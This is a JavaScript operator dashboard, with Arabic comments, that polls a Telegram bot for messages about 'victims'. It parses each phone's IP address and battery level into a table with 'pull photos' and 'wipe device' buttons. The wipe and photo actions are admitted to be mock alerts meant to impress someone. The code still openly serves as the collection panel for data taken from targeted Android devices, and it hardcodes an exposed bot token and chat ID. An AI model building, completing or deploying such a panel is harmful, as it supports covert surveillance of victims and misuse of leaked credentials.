// --- إعدادات الربط والتحكم (Matrix Jo) ---
const BOT_TOKEN = '8796589413:AAEiO4uqJaeuglsWnBD_7b9Qocj1P_rndjs';
const CHAT_ID = '8335474916';

// دالة لجلب البيانات من بوت التليجرام وتحديث اللوحة
async function fetchVictims() {
    try {
        const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/getUpdates`);
        const data = await response.json();
        
        if (data.ok && data.result.length > 0) {
            const logsBody = document.getElementById('logs-body');
            const totalVictims = document.getElementById('total-v');
            
            // تنظيف الجدول قبل عرض البيانات الجديدة
            logsBody.innerHTML = '';
            let count = 0;

            // استخراج الرسائل التي تحتوي على كلمة Target (الضحايا)
            data.result.forEach(item => {
                if (item.message && item.message.text && item.message.text.includes('Target')) {
                    count++;
                    const text = item.message.text;
                    
                    // استخراج البيانات باستخدام Regex
                    const ip = text.match(/IP:\s*`(.+?)`/)?.[1] || '0.0.0.0';
                    const bat = text.match(/Battery:\s*(.+)/)?.[1] || '---';
                    const time = new Date(item.message.date * 1000).toLocaleTimeString('ar-EG');

                    // إضافة السطر للجدول بتصميم الألوان المطلوبة
                    const row = `
                        <tr>
                            <td>${time}</td>
                            <td style="color: #fff; font-weight: bold;">${ip}</td>
                            <td>Android / Mobile</td>
                            <td style="color: #00ff41;">${bat}</td>
                            <td>
                                <button class="btn-action" onclick="sendCommand('سحب الصور')">سحب الصور</button>
                                <button class="btn-action btn-danger" onclick="sendCommand('فرمتة')">فرمتة</button>
                            </td>
                        </tr>
                    `;
                    logsBody.insertAdjacentHTML('afterbegin', row);
                }
            });
            totalVictims.innerText = count;
        }
    } catch (err) {
        console.error("Matrix Sync Error:", err);
    }
}

// دالة وهمية للأوامر عشان تبهر عارف
function sendCommand(cmd) {
    if (cmd === 'فرمتة') {
        if (confirm("⚠️ تحذير: أنت على وشك مسح جميع بيانات الضحية نهائياً. هل تريد المتابعة؟")) {
            alert("تم إرسال أمر الفرمتة الشاملة بنجاح ☣️");
        }
    } else {
        alert("جاري الاتصال بالجهاز لسحب الملفات... يرجى الانتظار ⏳");
    }
}

// تحديث تلقائي كل 15 ثانية
setInterval(fetchVictims, 15000);
window.onload = fetchVictims;
